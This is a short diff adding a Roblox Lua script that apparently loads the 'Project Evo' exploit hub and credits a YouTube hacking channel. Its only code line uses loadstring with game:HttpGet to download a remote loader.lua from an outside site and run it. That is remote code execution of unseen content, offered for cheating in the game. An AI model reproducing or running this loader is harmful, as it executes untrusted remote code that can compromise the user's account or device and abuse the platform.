@@ -1,0 +1,5 @@
+--YT: CoDeXHackPlayz 
+
+--Project Evo Web : https://projectevo.xyz/
+
+loadstring(game:HttpGet("https://projectevo.xyz/script/loader.lua"))()
